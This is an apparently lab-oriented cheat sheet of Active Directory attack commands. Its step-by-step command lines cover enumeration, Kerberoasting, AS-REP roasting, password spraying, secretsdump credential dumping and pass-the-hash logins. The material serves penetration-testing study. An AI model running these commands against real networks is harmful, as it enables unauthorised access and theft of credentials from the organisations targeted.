# Active Directory Enumeration

## Content

- Domain Information
- Network Discovery
- DNS Enumeration
- SMB Enumeration
- LDAP Enumeration
- RPC Enumeration
- Kerberos Enumeration
- User Enumeration
- Group Enumeration
- BloodHound
- Password Attacks
- Kerberoasting
- AS-REP Roasting
- Lateral Movement
- Privilege Escalation
- Credential Dumping
- Tools
- References


# 1. Domain Information

## Identify Domain

Basic information:

```bash
hostname
whoami
whoami /domain
echo %USERDOMAIN%
```

Linux:

```bash
domainname
realm list
```

Check current user:

```bash
whoami /all
```

Useful information:

- Domain name
- Domain controller
- Current user privileges
- Group memberships


---

# 2. Network Discovery

## Nmap Initial Scan

Discover hosts:

```bash
nmap -sn 10.10.10.0/24
```

Full port scan:

```bash
nmap -sC -sV -p- <IP>
```

AD related ports:

```
53    DNS
88    Kerberos
135   RPC
139   NetBIOS
389   LDAP
445   SMB
464   Kerberos password change
636   LDAPS
3268  Global Catalog
3269  Global Catalog SSL
5985  WinRM
9389  AD Web Services
```

---

# 3. DNS Enumeration

DNS is critical in Active Directory.


## Query Domain Controller

```bash
nslookup <domain>
```

```bash
dig <domain>
```

Example:

```bash
dig dc.domain.local
```


## DNS Zone Transfer

Check:

```bash
dig axfr @<DNS_SERVER> <domain>
```


Tools:

```bash
dnsenum <domain>
```

```bash
dnsrecon -d <domain>
```

---

# 4. SMB Enumeration

SMB is one of the main AD attack surfaces.


## Enumerate Shares

Anonymous:

```bash
smbclient -L //<IP> -N
```


With credentials:

```bash
smbclient -L //<IP> -U username
```


## Connect Share

```bash
smbclient //<IP>/<share>
```


## Enum4linux

```bash
enum4linux-ng <IP>
```


Information:

- Users
- Groups
- Shares
- Domain information


## CrackMapExec / NetExec

```bash
nxc smb <IP>
```


Authenticated:

```bash
nxc smb <IP> -u user -p password
```


---

# 5. LDAP Enumeration

LDAP stores Active Directory information.


## Basic LDAP Query

```bash
ldapsearch -x -H ldap://<IP>
```


Authenticated:

```bash
ldapsearch -x \
-H ldap://<IP> \
-D "user@domain.local" \
-w password
```


Search users:

```bash
ldapsearch -x \
-H ldap://<IP> \
-b "DC=domain,DC=local"
```


Information:

- Users
- Groups
- Computers
- Domain policies

---

# 6. RPC Enumeration


Connect:

```bash
rpcclient -U "" <IP>
```


Commands:

```bash
enumdomusers
```

```bash
enumdomgroups
```

```bash
queryuser <RID>
```


---

# 7. User Enumeration


## Kerberos Users


Using Kerbrute:

```bash
kerbrute userenum \
-d domain.local \
users.txt
```


Example wordlist:

```
administrator
admin
backup
svc_backup
svc_sql
```

---

# 8. BloodHound


BloodHound maps AD relationships.


## Collect Data


Linux:

```bash
bloodhound-python \
-d domain.local \
-u username \
-p password \
-c all
```


Windows:

```powershell
SharpHound.exe -c All
```


Upload:

```
.zip file → BloodHound
```


Look for:

- Domain Admin paths
- ACL abuse
- Kerberoastable users
- Delegation
- Sessions

---

# 9. Kerberoasting


Find service accounts:

```bash
GetUserSPNs.py \
-domain.local/user:password \
-request
```


Output:

```
$krb5tgs$23$*
```


Crack:

```bash
hashcat -m 13100 hash.txt rockyou.txt
```


---

# 10. AS-REP Roasting


Find users without Kerberos pre-authentication.


Command:

```bash
GetNPUsers.py \
-domain.local/ \
-usersfile users.txt \
-no-pass
```


Example output:

```
$krb5asrep$23$
```


Crack:

```bash
hashcat -m 18200 hash.txt rockyou.txt
```

---

# 11. Password Attacks


## Password Spraying


Avoid brute force.

Example:

```bash
nxc smb <IP> \
-u users.txt \
-p Password123
```


Common passwords:

```
SeasonYear
CompanyName2026
Welcome123
Password123
```

---

# 12. Credential Dumping


## SAM Database


Requires Administrator:

```bash
secretsdump.py \
domain/user:password@IP
```


Example:

```bash
secretsdump.py administrator@10.10.10.10
```


Extract:

- NTLM hashes
- Cached credentials
- LSA secrets

---

# 13. Lateral Movement


## WinRM


Check:

```bash
nxc winrm <IP>
```


Connect:

```bash
evil-winrm \
-i <IP> \
-u user \
-p password
```


---

## Pass The Hash


Using NTLM hash:

```bash
evil-winrm \
-i <IP> \
-u Administrator \
-H <NTLM_HASH>
```


---

# 14. Privilege Escalation in AD


Common techniques:


## ACL Abuse

Look for:

- GenericAll
- GenericWrite
- WriteDACL
- WriteOwner


Tools:

- BloodHound
- PowerView


---

## Delegation Attacks

Types:

- Unconstrained Delegation
- Constrained Delegation
- Resource Based Constrained Delegation


---

# 15. Useful Tools


## Enumeration

- Nmap
- NetExec
- Enum4linux-ng
- LDAPSearch
- DNSRecon
- Kerbrute


## AD Analysis

- BloodHound
- SharpHound
- PowerView


## Exploitation

- Impacket
- Evil-WinRM
- Mimikatz


---

# 16. Common HTB AD Workflow


```
1. Nmap
      |
2. Identify Domain
      |
3. DNS Enumeration
      |
4. SMB / LDAP Enumeration
      |
5. User Enumeration
      |
6. Password Attacks
      |
7. Kerberoasting / ASREP
      |
8. BloodHound
      |
9. Lateral Movement
      |
10. Privilege Escalation
```


---

# References

- https://bloodhound.readthedocs.io/
- https://github.com/fortra/impacket
- https://github.com/ropnop/kerbrute
- https://github.com/NetExec/NetExec
- https://gtfobins.github.io/
